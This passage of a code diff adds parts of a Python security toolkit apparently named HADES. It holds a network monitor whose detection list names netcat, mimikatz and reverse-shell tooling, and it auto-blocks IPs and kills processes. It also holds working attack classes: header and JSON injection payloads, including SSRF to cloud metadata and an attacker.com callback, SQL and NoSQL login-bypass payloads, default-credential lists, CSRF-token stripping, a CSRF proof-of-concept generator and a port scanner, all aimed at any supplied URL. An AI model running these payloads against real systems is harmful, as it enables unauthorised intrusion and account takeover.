+        'port_scan': {'id': 'T1046', 'name': 'Network Service Scanning', 'category': 'reconnaissance'},
+        'brute_force': {'id': 'T1110', 'name': 'Brute Force', 'category': 'credential_access'},
+        'c2_connection': {'id': 'T1071', 'name': 'Command and Control', 'category': 'command_control'},
+        'lateral_movement': {'id': 'T1021', 'name': 'Remote Services', 'category': 'lateral_movement'},
+        'exploitation': {'id': 'T1190', 'name': 'Exploit Public-Facing Application', 'category': 'initial_access'},
+    }
+    
+    MALICIOUS_IPS = set()
+    SUSPICIOUS_PATTERNS = [
+        'nmap', 'masscan', 'nikto', 'sqlmap', 'hydra', 'medusa',
+        'metasploit', 'cobalt', 'beacon', 'mimikatz', 'powershell -enc',
+        'meterpreter', 'reverse_tcp', 'bind_shell', 'nc.exe', 'netcat'
+    ]
+    
+    # Defense response levels
+    RESPONSE_LEVELS = {
+        'observe': 0,    # Log only
+        'warn': 1,       # Log + alert
+        'throttle': 2,   # Slow down / tarpit
+        'block_temp': 3, # Temporary block (TTL)
+        'block_perm': 4, # Permanent block + firewall
+        'counter': 5     # Active countermeasures
+    }
+    
+    def __init__(self, kb: 'KnowledgeBase' = None):
+        super().__init__()
+        self.kb = kb
+        self.running = False
+        self.defense_mode = False
+        self.learning_mode = True
+        self.auto_defend = True  # NEW: Automatic defense responses
+        self.response_level = 3  # Default: block_temp
+        self.connection_history = []
+        self.threat_log = []
+        self.blocked_ips = set()
+        
+        # NEW: Behavioral tracking for each IP
+        self.ip_behavior = defaultdict(lambda: {
+            'ports_accessed': [],
+            'connection_times': [],
+            'failed_auths': 0,
+            'threat_score': 0.0,
+            'last_action': None,
+            'action_time': None
+        })
+        
+        # Load known malicious IPs from KB
+        if self.kb:
+            try:
+                self.MALICIOUS_IPS = set(self.kb.get_malicious_ips(3.0))
+            except:
+                pass
+        
+        self.stats = {
+            'total_connections': 0,
+            'threats_detected': 0,
+            'attacks_blocked': 0,
+            'scans_detected': 0,
+            'brute_force_detected': 0,
+            'unique_ips': set(),
+            'start_time': None
+        }
+        
+    def run(self):
+        self.running = True
+        self.stats['start_time'] = datetime.now()
+        self.status_update.emit("🛡️ Network Monitor ACTIVE - Watching connections...")
+        
+        while self.running:
+            try:
+                connections = self._get_connections()
+                for conn in connections:
+                    self._analyze_connection(conn)
+                    
+                self._emit_stats()
+                time.sleep(1)
+            except Exception as e:
+                self.status_update.emit(f"Monitor error: {str(e)}")
+                time.sleep(5)
+                
+    def stop(self):
+        self.running = False
+        self.status_update.emit("🔴 Network Monitor STOPPED")
+        
+    def _get_connections(self) -> List[Dict]:
+        import psutil
+        connections = []
+        try:
+            for conn in psutil.net_connections(kind='inet'):
+                if conn.status == 'ESTABLISHED' or conn.status == 'LISTEN':
+                    conn_info = {
+                        'local_addr': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A",
+                        'local_port': conn.laddr.port if conn.laddr else 0,
+                        'remote_addr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
+                        'remote_ip': conn.raddr.ip if conn.raddr else None,
+                        'remote_port': conn.raddr.port if conn.raddr else 0,
+                        'status': conn.status,
+                        'pid': conn.pid,
+                        'timestamp': datetime.now().isoformat()
+                    }
+                    
+                    if conn.pid:
+                        try:
+                            proc = psutil.Process(conn.pid)
+                            conn_info['process'] = proc.name()
+                            conn_info['cmdline'] = ' '.join(proc.cmdline()[:3])
+                        except:
+                            conn_info['process'] = 'Unknown'
+                            conn_info['cmdline'] = ''
+                    
+                    connections.append(conn_info)
+                    self.stats['total_connections'] += 1
+                    if conn_info['remote_ip']:
+                        self.stats['unique_ips'].add(conn_info['remote_ip'])
+        except Exception as e:
+            pass
+            
+        return connections
+        
+    def _analyze_connection(self, conn: Dict):
+        threat_level = 'SAFE'
+        threat_type = None
+        threat_details = []
+        attack_technique = None
+        
+        remote_port = conn.get('remote_port', 0)
+        remote_ip = conn.get('remote_ip')
+        local_port = conn.get('local_port', 0)
+        process = conn.get('process', '')
+        cmdline = conn.get('cmdline', '')
+        
+        # Update behavioral tracking for this IP
+        if remote_ip:
+            self._update_ip_behavior(remote_ip, local_port, conn)
+            
+            # Check for behavioral patterns (port scan, brute force)
+            behavior_threat = self._detect_behavioral_attack(remote_ip)
+            if behavior_threat:
+                threat_level = behavior_threat['level']
+                threat_type = behavior_threat['type']
+                threat_details.extend(behavior_threat['details'])
+                attack_technique = behavior_threat.get('technique')
+        
+        # Check against known bad IPs
+        if remote_ip in self.blocked_ips or remote_ip in self.MALICIOUS_IPS:
+            threat_level = 'CRITICAL'
+            threat_type = 'BLOCKED_IP'
+            threat_details.append(f"Connection from blocked IP: {remote_ip}")
+        
+        # Check IP reputation from knowledge base
+        if remote_ip and self.kb:
+            ip_rep = self.kb.get_ip_reputation(remote_ip)
+            if ip_rep and ip_rep['threat_score'] >= 5.0:
+                threat_level = 'HIGH'
+                threat_type = threat_type or 'KNOWN_THREAT'
+                threat_details.append(f"Known threat: score={ip_rep['threat_score']:.1f}, attacks={ip_rep['attack_count']}")
+            
+        if remote_port in self.THREAT_PORTS:
+            if threat_level not in ['CRITICAL', 'HIGH']:
+                threat_level = 'WARNING'
+            threat_type = threat_type or 'SUSPICIOUS_PORT'
+            threat_details.append(f"Connection to sensitive port: {remote_port} ({self.THREAT_PORTS[remote_port]})")
+            
+        if local_port in self.THREAT_PORTS and conn['status'] == 'LISTEN':
+            if threat_level == 'SAFE':
+                threat_level = 'WARNING'
+            threat_type = threat_type or 'OPEN_SENSITIVE_PORT'
+            threat_details.append(f"Listening on sensitive port: {local_port} ({self.THREAT_PORTS[local_port]})")
+            
+        for pattern in self.SUSPICIOUS_PATTERNS:
+            if pattern.lower() in cmdline.lower() or pattern.lower() in process.lower():
+                threat_level = 'HIGH'
+                threat_type = 'SUSPICIOUS_PROCESS'
+                threat_details.append(f"Suspicious process pattern: {pattern}")
+                attack_technique = self.ATTACK_TECHNIQUES.get('exploitation')
+                break
+                
+        if remote_port in [4444, 5555, 6666, 7777, 8888, 9999, 31337, 12345]:
+            threat_level = 'HIGH'
+            threat_type = 'POTENTIAL_C2'
+            threat_details.append(f"Potential C2/backdoor port: {remote_port}")
+            attack_technique = self.ATTACK_TECHNIQUES.get('c2_connection')
+            
+        conn['threat_level'] = threat_level
+        conn['threat_type'] = threat_type
+        conn['threat_details'] = threat_details
+        conn['attack_technique'] = attack_technique
+        
+        if threat_level != 'SAFE':
+            self.stats['threats_detected'] += 1
+            self.threat_log.append(conn)
+            self.threat_detected.emit(conn)
+            
+            if self.learning_mode and self.kb:
+                self._learn_from_threat(conn, attack_technique)
+                
+            # Auto-defense based on threat level
+            if self.auto_defend and self.defense_mode:
+                self._auto_respond(conn, threat_level, threat_type, attack_technique)
+        else:
+            self.connection_detected.emit(conn)
+            
+        self.connection_history.append(conn)
+        if len(self.connection_history) > 1000:
+            self.connection_history = self.connection_history[-500:]
+    
+    def _update_ip_behavior(self, ip: str, port: int, conn: Dict):
+        """Track connection behavior for each IP"""
+        now = time.time()
+        behavior = self.ip_behavior[ip]
+        
+        # Add this connection
+        behavior['ports_accessed'].append((port, now))
+        behavior['connection_times'].append(now)
+        
+        # Clean old entries (outside time windows)
+        cutoff_scan = now - self.SCAN_THRESHOLD_TIME
+        cutoff_brute = now - self.BRUTE_FORCE_TIME
+        
+        behavior['ports_accessed'] = [(p, t) for p, t in behavior['ports_accessed'] if t > cutoff_scan]
+        behavior['connection_times'] = [t for t in behavior['connection_times'] if t > cutoff_brute]
+    
+    def _detect_behavioral_attack(self, ip: str) -> Optional[Dict]:
+        """Detect behavioral attacks like port scans and brute force"""
+        behavior = self.ip_behavior[ip]
+        
+        # Check for port scan
+        unique_ports = set(p for p, t in behavior['ports_accessed'])
+        if len(unique_ports) >= self.SCAN_THRESHOLD_PORTS:
+            self.stats['scans_detected'] += 1
+            behavior['threat_score'] += 2.0
+            return {
+                'level': 'HIGH',
+                'type': 'PORT_SCAN',
+                'technique': self.ATTACK_TECHNIQUES['port_scan'],
+                'details': [f"Port scan detected: {len(unique_ports)} ports in {self.SCAN_THRESHOLD_TIME}s",
+                           f"Ports: {sorted(list(unique_ports))[:10]}..."]
+            }
+        
+        # Check for brute force (many connections to auth ports)
+        auth_ports = {22, 23, 21, 3389, 5900, 445, 3306, 5432, 1433}
+        auth_connections = sum(1 for p, t in behavior['ports_accessed'] if p in auth_ports)
+        if auth_connections >= self.BRUTE_FORCE_THRESHOLD:
+            self.stats['brute_force_detected'] += 1
+            behavior['threat_score'] += 3.0
+            return {
+                'level': 'CRITICAL',
+                'type': 'BRUTE_FORCE',
+                'technique': self.ATTACK_TECHNIQUES['brute_force'],
+                'details': [f"Brute force attack detected: {auth_connections} auth attempts in {self.BRUTE_FORCE_TIME}s"]
+            }
+        
+        # Check accumulated threat score
+        if behavior['threat_score'] >= 5.0:
+            return {
+                'level': 'HIGH',
+                'type': 'SUSPICIOUS_BEHAVIOR',
+                'details': [f"Accumulated threat score: {behavior['threat_score']:.1f}"]
+            }
+        
+        return None
+    
+    def _auto_respond(self, conn: Dict, threat_level: str, threat_type: str, technique: Dict = None):
+        """Automatically respond to threats based on severity"""
+        remote_ip = conn.get('remote_ip')
+        if not remote_ip:
+            return
+        
+        response_action = None
+        response_details = []
+        
+        # Determine response based on threat level
+        if threat_level == 'CRITICAL':
+            response_action = 'block_perm'
+            response_details.append(f"Permanent block for CRITICAL threat: {threat_type}")
+            self._apply_firewall_block(remote_ip, permanent=True)
+            self._kill_connection(conn)
+            
+        elif threat_level == 'HIGH':
+            response_action = 'block_temp'
+            response_details.append(f"Temporary block for HIGH threat: {threat_type}")
+            self._apply_firewall_block(remote_ip, permanent=False, ttl=3600)
+            
+        elif threat_level == 'WARNING':
+            response_action = 'warn'
+            response_details.append(f"Warning logged for: {threat_type}")
+        
+        # Add to blocked list
+        if response_action in ['block_perm', 'block_temp']:
+            self.blocked_ips.add(remote_ip)
+            self.MALICIOUS_IPS.add(remote_ip)
+            self.stats['attacks_blocked'] += 1
+            
+            # Update KB
+            if self.kb:
+                self.kb.block_ip(remote_ip, f"Auto-blocked: {threat_type}")
+                self.kb.log_attack_event(
+                    event_type=threat_type,
+                    src_ip=remote_ip,
+                    dst_port=conn.get('local_port', 0),
+                    severity=threat_level,
+                    evidence={'details': conn.get('threat_details', [])},
+                    action_taken=response_action,
+                    technique_id=technique['id'] if technique else None
+                )
+        
+        # Emit response signal
+        self.auto_response.emit({
+            'ip': remote_ip,
+            'action': response_action,
+            'threat_type': threat_type,
+            'threat_level': threat_level,
+            'details': response_details,
+            'technique': technique
+        })
+        
+        self.status_update.emit(f"⚔️ AUTO-DEFENSE: {response_action.upper()} on {remote_ip} ({threat_type})")
+    
+    def _apply_firewall_block(self, ip: str, permanent: bool = False, ttl: int = 3600):
+        """Apply OS-level firewall block"""
+        import platform
+        os_type = platform.system().lower()
+        
+        try:
+            if os_type == 'windows':
+                rule_name = f"HADES_BLOCK_{ip.replace('.', '_')}"
+                cmd = f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=block remoteip={ip}'
+                import subprocess
+                subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
+                self.status_update.emit(f"🛡️ Firewall: Blocked {ip} (Windows)")
+                
+            elif os_type == 'linux':
+                cmd = f'iptables -A INPUT -s {ip} -j DROP'
+                import subprocess
+                subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
+                self.status_update.emit(f"🛡️ Firewall: Blocked {ip} (Linux)")
+                
+            elif os_type == 'darwin':
+                # macOS - requires pfctl setup
+                self.status_update.emit(f"🛡️ Block request for {ip} (macOS - manual pfctl needed)")
+                
+        except Exception as e:
+            self.status_update.emit(f"⚠️ Firewall block failed for {ip}: {str(e)[:50]}")
+    
+    def _kill_connection(self, conn: Dict):
+        """Kill an active connection by terminating the associated process"""
+        pid = conn.get('pid')
+        if not pid:
+            return
+        
+        try:
+            import psutil
+            proc = psutil.Process(pid)
+            proc_name = proc.name()
+            
+            # Safety check - don't kill system processes
+            safe_to_kill = proc_name.lower() not in [
+                'system', 'svchost.exe', 'csrss.exe', 'wininit.exe', 
+                'services.exe', 'lsass.exe', 'explorer.exe', 'init', 'systemd'
+            ]
+            
+            if safe_to_kill:
+                proc.terminate()
+                self.status_update.emit(f"🔥 Terminated process: {proc_name} (PID: {pid})")
+        except Exception as e:
+            pass
+            
+    def _learn_from_threat(self, conn: Dict, technique: Dict = None):
+        """Learn from detected threats and update knowledge base"""
+        if not self.kb:
+            return
+            
+        # Store as threat finding
+        finding = ThreatFinding(
+            path=f"Network:{conn.get('remote_addr', 'Unknown')}",
+            threat_type=conn.get('threat_type', 'network_threat'),
+            pattern=f"Port:{conn.get('remote_port')} Process:{conn.get('process', 'Unknown')}",
+            severity=conn.get('threat_level', 'MEDIUM'),
+            code_snippet=str(conn.get('threat_details', [])),
+            browser='Network Monitor',
+            context=f"PID:{conn.get('pid')} CMD:{conn.get('cmdline', '')[:100]}"
+        )
+        self.kb.store_threat_finding(finding)
+        
+        # Add to malicious IPs
+        if conn.get('remote_ip'):
+            self.MALICIOUS_IPS.add(conn['remote_ip'])
+        
+        # Store/update the attack technique
+        if technique:
+            mitigations = []
+            if technique['id'] == 'T1046':  # Port scan
+                mitigations = [
+                    "Enable firewall rules to block port scanning",
+                    "Implement port knocking for sensitive services",
+                    "Use intrusion detection systems (IDS)"
+                ]
+            elif technique['id'] == 'T1110':  # Brute force
+                mitigations = [
+                    "Implement account lockout policies",
+                    "Use multi-factor authentication",
+                    "Limit login attempts with fail2ban or similar",
+                    "Use strong password policies"
+                ]
+            elif technique['id'] == 'T1071':  # C2
+                mitigations = [
+                    "Block known C2 ports at firewall",
+                    "Monitor for unusual outbound connections",
+                    "Implement egress filtering"
+                ]
+            
+            self.kb.store_technique(
+                technique_id=technique['id'],
+                name=technique['name'],
+                category=technique['category'],
+                description=f"Detected via network monitoring",
+                indicators=[conn.get('threat_type', ''), f"Port: {conn.get('remote_port')}"],
+                mitigations=mitigations,
+                detection_rules=[f"Monitor for {technique['name']} patterns"],
+                confidence=0.8
+            )
+                
+    def _counter_attack(self, conn: Dict):
+        remote_ip = conn.get('remote_ip')
+        if not remote_ip:
+            return
+            
+        self.blocked_ips.add(remote_ip)
+        self.stats['attacks_blocked'] += 1
+        
+        self.status_update.emit(f"⚔️ COUNTER: Blocked {remote_ip} - {conn.get('threat_type')}")
+        
+        try:
+            pid = conn.get('pid')
+            if pid:
+                import psutil
+                try:
+                    proc = psutil.Process(pid)
+                    if conn.get('threat_level') == 'CRITICAL':
+                        proc.terminate()
+                        self.status_update.emit(f"🔥 Terminated malicious process: {proc.name()} (PID: {pid})")
+                except:
+                    pass
+        except:
+            pass
+            
+    def _emit_stats(self):
+        runtime = datetime.now() - self.stats['start_time'] if self.stats['start_time'] else None
+        self.stats_update.emit({
+            'total_connections': self.stats['total_connections'],
+            'threats_detected': self.stats['threats_detected'],
+            'attacks_blocked': self.stats['attacks_blocked'],
+            'unique_ips': len(self.stats['unique_ips']),
+            'blocked_ips': len(self.blocked_ips),
+            'runtime': str(runtime).split('.')[0] if runtime else '00:00:00',
+            'defense_mode': self.defense_mode,
+            'learning_mode': self.learning_mode
+        })
+        
+    def set_defense_mode(self, enabled: bool):
+        self.defense_mode = enabled
+        mode = "ENABLED" if enabled else "DISABLED"
+        self.status_update.emit(f"🛡️ Active Defense {mode}")
+        
+    def set_learning_mode(self, enabled: bool):
+        self.learning_mode = enabled
+        mode = "ENABLED" if enabled else "DISABLED"
+        self.status_update.emit(f"🧠 Learning Mode {mode}")
+        
+    def block_ip(self, ip: str):
+        self.blocked_ips.add(ip)
+        self.status_update.emit(f"🚫 Manually blocked IP: {ip}")
+        
+    def unblock_ip(self, ip: str):
+        self.blocked_ips.discard(ip)
+        self.status_update.emit(f"✅ Unblocked IP: {ip}")
+        
+    def get_threat_log(self) -> List[Dict]:
+        return self.threat_log[-100:]
+        
+    def get_blocked_ips(self) -> List[str]:
+        return list(self.blocked_ips)
+
+
+# ============================================================================
+# REQUEST INJECTION ENGINE
+# ============================================================================
+
+class RequestInjector:
+    def __init__(self, proxy_manager: ProxyManager = None):
+        self.proxy = proxy_manager or ProxyManager()
+        
+    HEADER_INJECTIONS = {
+        'host': ['evil.com', 'localhost', '127.0.0.1', 'internal.target'],
+        'x-forwarded-for': ['127.0.0.1', '10.0.0.1', 'localhost', '::1'],
+        'x-forwarded-host': ['evil.com', 'localhost'],
+        'x-original-url': ['/admin', '/internal', '/../../../etc/passwd'],
+        'x-rewrite-url': ['/admin', '/api/internal'],
+        'x-custom-ip-authorization': ['127.0.0.1'],
+        'x-real-ip': ['127.0.0.1', '10.0.0.1'],
+        'referer': ['https://trusted-site.com', 'https://target.com/admin'],
+        'origin': ['https://evil.com', 'null'],
+        'content-type': ['application/json', 'application/xml', 'text/xml'],
+        'accept': ['application/json', '../../../etc/passwd'],
+    }
+    
+    JSON_PAYLOADS = {
+        'type_juggling': [
+            {'password': True},
+            {'password': 0},
+            {'password': []},
+            {'password': None},
+            {'id': {'$gt': ''}},  # NoSQL
+        ],
+        'injection': [
+            {'username': "admin'--", 'password': 'x'},
+            {'username': {'$ne': ''}, 'password': {'$ne': ''}},  # NoSQL bypass
+            {'__proto__': {'admin': True}},  # Prototype pollution
+            {'constructor': {'prototype': {'admin': True}}},
+        ],
+        'ssrf': [
+            {'url': 'http://127.0.0.1:80'},
+            {'url': 'http://169.254.169.254/latest/meta-data/'},
+            {'url': 'file:///etc/passwd'},
+            {'webhook': 'http://attacker.com/callback'},
+        ]
+    }
+    
+    WAF_BYPASS_HEADERS = {
+        'standard': {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+        },
+        'googlebot': {
+            'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+        },
+        'bypass_waf': {
+            'X-Originating-IP': '127.0.0.1',
+            'X-Forwarded-For': '127.0.0.1',
+            'X-Remote-IP': '127.0.0.1',
+            'X-Remote-Addr': '127.0.0.1',
+            'X-Client-IP': '127.0.0.1',
+            'X-Host': '127.0.0.1',
+            'X-Forwarded-Host': '127.0.0.1',
+        }
+    }
+    
+    def inject_headers(self, url: str, test_headers: Dict = None) -> List[Dict]:
+        if not HAS_REQUESTS:
+            return [{'error': 'requests not installed'}]
+            
+        results = []
+        session = self.proxy.get_session()
+        test_headers = test_headers or self.HEADER_INJECTIONS
+        
+        # Baseline request
+        try:
+            baseline = session.get(url, timeout=10, verify=False)
+            baseline_len = len(baseline.content)
+            baseline_status = baseline.status_code
+        except:
+            baseline_len = 0
+            baseline_status = 0
+        
+        for header, values in test_headers.items():
+            for value in values:
+                try:
+                    headers = {header: value}
+                    r = session.get(url, headers=headers, timeout=10, verify=False)
+                    
+                    diff = abs(len(r.content) - baseline_len)
+                    interesting = (r.status_code != baseline_status or 
+                                  diff > 100 or 
+                                  r.status_code in [200, 302, 403, 500])
+                    
+                    results.append({
+                        'header': header,
+                        'value': value,
+                        'status': r.status_code,
+                        'length': len(r.content),
+                        'diff': diff,
+                        'interesting': interesting
+                    })
+                except Exception as e:
+                    results.append({'header': header, 'value': value, 'error': str(e)})
+                    
+        return results
+    
+    def inject_json(self, url: str, payload_type: str = 'injection') -> List[Dict]:
+        if not HAS_REQUESTS:
+            return [{'error': 'requests not installed'}]
+            
+        results = []
+        session = self.proxy.get_session()
+        payloads = self.JSON_PAYLOADS.get(payload_type, self.JSON_PAYLOADS['injection'])
+        
+        for payload in payloads:
+            try:
+                r = session.post(url, json=payload, timeout=10, verify=False)
+                results.append({
+                    'payload': str(payload),
+                    'status': r.status_code,
+                    'length': len(r.content),
+                    'response_preview': r.text[:200]
+                })
+            except Exception as e:
+                results.append({'payload': str(payload), 'error': str(e)})
+                
+        return results
+
+
+# ============================================================================
+# CSRF & LOGIN BYPASS
+# ============================================================================
+
+class AuthBypass:
+    LOGIN_BYPASS_PAYLOADS = {
+        'sql_auth_bypass': [
+            ("admin'--", "x"),
+            ("' OR '1'='1'--", "x"),
+            ("admin' OR '1'='1", "x"),
+            ("' OR 1=1--", "x"),
+            ("admin'/*", "x"),
+            ("') OR ('1'='1", "x"),
+            ("admin' #", "x"),
+            ("' OR ''='", "x"),
+        ],
+        'default_creds': [
+            ("admin", "admin"),
+            ("admin", "password"),
+            ("admin", "123456"),
+            ("root", "root"),
+            ("root", "toor"),
+            ("administrator", "administrator"),
+            ("test", "test"),
+            ("guest", "guest"),
+            ("admin", "admin123"),
+            ("admin", "Password1"),
+        ],
+        'nosql_bypass': [
+            ({"$gt": ""}, {"$gt": ""}),
+            ({"$ne": ""}, {"$ne": ""}),
+            ({"$regex": ".*"}, {"$regex": ".*"}),
+        ]
+    }
+    
+    CSRF_BYPASS_TECHNIQUES = [
+        {'name': 'Remove Token', 'action': 'remove_csrf_token'},
+        {'name': 'Empty Token', 'action': 'empty_token'},
+        {'name': 'Random Token', 'action': 'random_token'},
+        {'name': 'Reuse Token', 'action': 'reuse_token'},
+        {'name': 'Change Method', 'action': 'change_method'},
+        {'name': 'Remove Referer', 'action': 'remove_referer'},
+        {'name': 'Change Content-Type', 'action': 'change_content_type'},
+    ]
+    
+    def __init__(self, proxy_manager: ProxyManager = None):
+        self.proxy = proxy_manager or ProxyManager()
+        
+    def try_login_bypass(self, url: str, user_field: str = 'username', 
+                         pass_field: str = 'password', bypass_type: str = 'sql_auth_bypass') -> List[Dict]:
+        if not HAS_REQUESTS:
+            return [{'error': 'requests not installed'}]
+            
+        results = []
+        session = self.proxy.get_session()
+        payloads = self.LOGIN_BYPASS_PAYLOADS.get(bypass_type, [])
+        
+        # Get baseline
+        try:
+            baseline = session.post(url, data={user_field: 'invalid', pass_field: 'invalid'}, 
+                                   timeout=10, verify=False, allow_redirects=False)
+            baseline_status = baseline.status_code
+            baseline_len = len(baseline.content)
+        except:
+            baseline_status = 0
+            baseline_len = 0
+        
+        for user_payload, pass_payload in payloads:
+            try:
+                data = {user_field: user_payload, pass_field: pass_payload}
+                r = session.post(url, data=data, timeout=10, verify=False, allow_redirects=False)
+                
+                # Check for success indicators
+                success_indicators = [
+                    r.status_code in [302, 303],  # Redirect after login
+                    r.status_code != baseline_status,
+                    abs(len(r.content) - baseline_len) > 200,
+                    'dashboard' in r.text.lower(),
+                    'welcome' in r.text.lower(),
+                    'logout' in r.text.lower(),
+                    'set-cookie' in str(r.headers).lower() and 'session' in str(r.headers).lower(),
+                ]
+                
+                results.append({
+                    'username': str(user_payload),
+                    'password': str(pass_payload),
+                    'status': r.status_code,
+                    'length': len(r.content),
+                    'potential_bypass': any(success_indicators),
+                    'redirect': r.headers.get('Location', '')
+                })
+            except Exception as e:
+                results.append({'username': str(user_payload), 'error': str(e)})
+                
+        return results
+    
+    def test_csrf_bypass(self, url: str, method: str = 'POST', 
+                         original_data: Dict = None) -> List[Dict]:
+        if not HAS_REQUESTS:
+            return [{'error': 'requests not installed'}]
+            
+        results = []
+        session = self.proxy.get_session()
+        original_data = original_data or {}
+        
+        for technique in self.CSRF_BYPASS_TECHNIQUES:
+            try:
+                data = original_data.copy()
+                headers = {}
+                
+                if technique['action'] == 'remove_csrf_token':
+                    data.pop('csrf_token', None)
+                    data.pop('_token', None)
+                    data.pop('csrfmiddlewaretoken', None)
+                elif technique['action'] == 'empty_token':
+                    for key in ['csrf_token', '_token', 'csrfmiddlewaretoken']:
+                        if key in data:
+                            data[key] = ''
+                elif technique['action'] == 'random_token':
+                    for key in ['csrf_token', '_token', 'csrfmiddlewaretoken']:
+                        if key in data:
+                            data[key] = hashlib.md5(os.urandom(16)).hexdigest()
+                elif technique['action'] == 'remove_referer':
+                    headers['Referer'] = ''
+                elif technique['action'] == 'change_content_type':
+                    headers['Content-Type'] = 'text/plain'
+                
+                if method.upper() == 'POST':
+                    r = session.post(url, data=data, headers=headers, timeout=10, 
+                                    verify=False, allow_redirects=False)
+                else:
+                    r = session.get(url, params=data, headers=headers, timeout=10, 
+                                   verify=False, allow_redirects=False)
+                
+                results.append({
+                    'technique': technique['name'],
+                    'status': r.status_code,
+                    'length': len(r.content),
+                    'success': r.status_code in [200, 302, 303]
+                })
+            except Exception as e:
+                results.append({'technique': technique['name'], 'error': str(e)})
+                
+        return results
+    
+    def generate_csrf_poc(self, url: str, method: str, data: Dict) -> str:
+        form_fields = '\n'.join([
+            f'    <input type="hidden" name="{k}" value="{v}" />'
+            for k, v in data.items()
+        ])
+        
+        return f'''<!DOCTYPE html>
+<html>
+<head><title>CSRF PoC</title></head>
+<body>
+  <h1>CSRF Proof of Concept</h1>
+  <form id="csrf-form" action="{url}" method="{method}">
+{form_fields}
+    <input type="submit" value="Submit" />
+  </form>
+  <script>
+    // Auto-submit on page load
+    // document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>'''
+
+
+class WebLearner:
+    EXPLOIT_PATTERNS = {
+        'sql_injection': [
+            r"(?:UNION\s+SELECT|OR\s+1\s*=\s*1|'\s*OR\s*'|--\s*$|;\s*DROP\s+TABLE)",
+            r"(?:SELECT\s+.*\s+FROM|INSERT\s+INTO|UPDATE\s+.*\s+SET|DELETE\s+FROM)",
+        ],
+        'xss': [
+            r"<script[^>]*>.*?</script>",
+            r"(?:javascript:|on\w+\s*=)",
+            r"(?:document\.cookie|document\.write|\.innerHTML)",
+        ],
+        'command_injection': [
+            r"(?:\|\s*\w+|;\s*\w+|`[^`]+`|\$\([^)]+\))",
+            r"(?:system\s*\(|exec\s*\(|shell_exec|passthru|popen)",
+        ],
+        'path_traversal': [
+            r"(?:\.\./|\.\.\\|%2e%2e%2f|%2e%2e/)",
+        ],
+        'lfi_rfi': [
+            r"(?:include\s*\(|require\s*\(|include_once|require_once).*(?:\$_GET|\$_POST|\$_REQUEST)",
+        ],
+    }
+    
+    def __init__(self, kb: KnowledgeBase):
+        self.kb = kb
+        
+    def learn_from_url(self, url: str) -> Dict[str, Any]:
+        if not HAS_REQUESTS:
+            return {'error': 'requests library not installed', 'patterns': [], 'exploits': []}
+            
+        try:
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+            response = requests.get(url, headers=headers, timeout=10, verify=False)
+            content = response.text
+            
+            patterns_found = []
+            exploits_found = []
+            
+            for exploit_type, patterns in self.EXPLOIT_PATTERNS.items():
+                for pattern in patterns:
+                    matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
+                    for match in matches[:5]:
+                        exploit_code = match if isinstance(match, str) else match[0]
+                        patterns_found.append({'type': exploit_type, 'pattern': pattern})
+                        exploits_found.append({
+                            'type': exploit_type,
+                            'code': exploit_code[:500],
+                            'source': url
+                        })
+                        self.kb.store_learned_exploit(url, exploit_type, exploit_code[:500], f"Learned from {url}")
+            
+            code_blocks = re.findall(r'<code[^>]*>(.*?)</code>', content, re.DOTALL | re.IGNORECASE)
+            code_blocks += re.findall(r'<pre[^>]*>(.*?)</pre>', content, re.DOTALL | re.IGNORECASE)
+            
+            for code in code_blocks[:10]:
+                clean_code = re.sub(r'<[^>]+>', '', code).strip()
+                if len(clean_code) > 20:
+                    for exploit_type, patterns in self.EXPLOIT_PATTERNS.items():
+                        for pattern in patterns:
+                            if re.search(pattern, clean_code, re.IGNORECASE):
+                                exploits_found.append({
+                                    'type': exploit_type,
+                                    'code': clean_code[:500],
+                                    'source': url
+                                })
+                                self.kb.store_learned_exploit(url, exploit_type, clean_code[:500], f"Code block from {url}")
+                                break
+            
+            self.kb.store_web_learning(url, response.headers.get('Content-Type', 'unknown'), patterns_found, exploits_found)
+            
+            return {
+                'url': url,
+                'status': response.status_code,
+                'patterns_found': len(patterns_found),
+                'exploits_learned': len(exploits_found),
+                'exploits': exploits_found[:10]
+            }
+            
+        except Exception as e:
+            return {'error': str(e), 'patterns': [], 'exploits': []}
+
+
+# ============================================================================
+# TOOL EXECUTOR - Run pentest tools
+# ============================================================================
+
+class ToolExecutor(QThread):
+    output = pyqtSignal(str)
+    finished_task = pyqtSignal(dict)
+    progress = pyqtSignal(int)
+    
+    def __init__(self, tool: str, target: str, options: Dict = None):
+        super().__init__()
+        self.tool = tool
+        self.target = target
+        self.options = options or {}
+        self._stop = False
+        
+    def stop(self):
+        self._stop = True
+        
+    def run(self):
+        result = {'tool': self.tool, 'target': self.target, 'findings': [], 'error': None}
+        
+        try:
+            if self.tool == 'port_scan':
+                result = self._port_scan()
+            elif self.tool == 'dir_bruteforce':
+                result = self._dir_bruteforce()
+            elif self.tool == 'subdomain_enum':
+                result = self._subdomain_enum()
+            elif self.tool == 'banner_grab':
+                result = self._banner_grab()
+            elif self.tool == 'vuln_scan':
+                result = self._vuln_scan()
+        except Exception as e:
+            result['error'] = str(e)
+            
+        self.finished_task.emit(result)
+        
+    def _port_scan(self) -> Dict:
+        host = self.target
+        ports = range(1, 1025)
+        open_ports = []
+        total = len(ports)
+        
+        self.output.emit(f"[*] Scanning {host} for open ports...")
+        
+        for i, port in enumerate(ports):
+            if self._stop:
+                break
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(0.5)
+                    if s.connect_ex((host, port)) == 0:
+                        open_ports.append(port)
+                        self.output.emit(f"[+] Port {port} is OPEN")
+            except:
+                pass
+            if i % 100 == 0:
+                self.progress.emit(int(i / total * 100))
+                
+        self.progress.emit(100)
+        return {'tool': 'port_scan', 'target': host, 'findings': open_ports, 'error': None}
+    
+    def _dir_bruteforce(self) -> Dict:
